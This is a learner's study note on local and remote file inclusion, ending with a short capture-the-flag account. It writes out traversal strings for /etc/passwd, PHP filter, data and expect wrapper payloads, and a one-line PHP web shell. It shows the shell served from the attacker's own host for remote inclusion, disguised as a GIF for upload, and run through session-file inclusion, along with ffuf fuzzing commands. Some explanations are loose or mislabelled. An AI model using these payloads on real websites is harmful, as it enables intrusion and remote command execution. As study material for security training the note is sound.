# What is LFI(Local File Inclusion)?
- It is exploiting the website with vulnerabilites such as sites with visible '=', backend servers open users and cookies are visible using the url or tools such as curl, ffuf and python3.

  ## Common exploits:
  - Using different php files might expose them this is vulnerable.
  - We can use `=/etc/passwd`
  - `=../../../../` to jump to root directory
  - `=..../..../..../` to bypass sanitiztion of ../
  - by encoding our lfi into url form using burp-suite
  - using ffuf to serach for php files to use php wrappers with filter-> `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>:<port>/FUZZ.php` and `=php://filter/conver.base64-encode/resource=<file u wanna read>` and u get the base64 output if php is vulnerable.
  - We can also convert our php get request into a base64 code and use it in the data wrapper.`echo '<?php system($_GET["cmd"]); ?> |base64`--> `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<your_php_in_base64_encoded_to_url>&cmd=pwd`
  - Another was is using input php wrapper and except php wrapper `http://<SERVER_IP>:<PORT>/index.php?language=expect://pwd` although we will need to encode 'expect://id' into url.

# What is RFI(Remote File Inclusion)?
- It is similar as lfi. RFI occurs when a site lets hacker input any file inside it.

  ## Common exploits:
  - Using a php file `echo '<?php system($_GET["cmd"]); ?>' > shell.php` and now we input this insde the server. First oen the listner `python3 -m http.server <listening_port>` the listening port can be determined by guesses(like here it should be 80 usually cuz it is the port for http servers). Then we input `=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=pwd` in their url and it will read the file.
  - Using ftp in the same way `python -m pyftpdlib -p 21`(in my pc I did not hve this and had loads of trouble to use this 😭) then `=ftp://<OUR_IP>/shell.php&cmd=pwd`
  - If we find any upload page we can use gif files over our php code into the system. `echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif` GIF89a is an image magic byte to bypass any checking if occured. To use the file we can look into the source code of the page and use it in the url `=./profile_images/shell.gif&cmd=pwd`.


  - log poisoning is the eaziest and most fun of all(cuz it has very less remembering part 😁). Now in most sites cookies are stored in '/var/lib/php/sessions/sess_' inside the backend server. We inspect the network and copy the cookies from there. The cookie stored has a prefix of sess_ so we use it like this - `=/var/lib/php/sessions/sess_cookie&cmd=pwd`.
 
# Using ffuf to search:
- Scaanning with ffuf is pretty usefull. There are 3 types of important according to me.
- `http://IP:PORT/FUZZ?value=value` Where ever I put FUZZ the tool will find for that part but it also needs that particular .txt fle to do that:
     1. For `http://IP:PORT/FUZZ?value=value` the file used is **common.txt** and its path is(for me) `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://IP:PORT/FUZZ?value=value"`
     2. For `http://IP:PORT/index.php?FUZZ=value` the file is **burp-parameter-names.txt** and its path `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://IP:PORT/index.php?FUZZ=value"`
     3. For `http://IP:PORT/index.php?value=FUZZ` the file is **lfi-linux-list.txt** and its path is `ffuf -w /usr/share/seclists/Fuzzing/LFI/lfi-linux-list.txt -u "http://IP:PORT/index.php?value=FUZZ"`
 

  # CTF
  ### Finding the vulnerabilty
  - First I get inside a site which had an apply.php at end and contact.php at end.
  - First both seemed sus but after checking them both were lfi proof.
  - But seeing inside apply.php I saw that ther was an upload thing I uploaded my shell.php file which had that *<?php system($_GET["cmd"]); ?>* code. Though the file didnt do much but the site's url changed a bit so i tested it but it failed too.
  - Then I went to its source code and found a url of im something like this */api/image.php/sd2EDW* it seemed very intersig so i tried it a bit too but nothing that I tried worked.
  ### Seeking help
  - After spending about half an hour I decided to see a writeup and to my suprise evrything I did was correct just the fact I did not use ffuf on that link was the mistake I did.
  - But even after that I was not able to tell what to do so I went to writeups again...
  - After seening it I realized that I did not have the experince to search for any other php file in source code cuz the person used base64 to encode the php files to read them.
  - And the second thing I learned was how to red those php files properly which helped him gain info on how the site worked.
  - With all the info we got I used the php filter to get our flag.
